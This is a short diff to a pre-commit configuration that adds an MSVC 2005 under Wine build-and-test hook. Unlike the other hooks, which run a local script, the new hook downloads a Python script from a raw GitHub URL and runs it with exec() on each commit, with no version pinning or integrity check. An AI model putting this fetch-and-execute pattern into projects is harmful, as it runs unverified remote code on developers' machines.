@@ -39,6 +39,11 @@ repos:
         entry: python scripts/precommit_matrix.py test clang
         language: python
         pass_filenames: false
+      - id: build-msvc-2005-wine
+        name: Build and Test (MSVC 2005 Wine)
+        entry: python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/SamuelMarks/c-ci/master/precommit_matrix.py').read())" build msvc_2005_wine
+        language: python
+        pass_filenames: false
       - id: build-msvc
         name: Build (MSVC)
         entry: python scripts/precommit_matrix.py build msvc
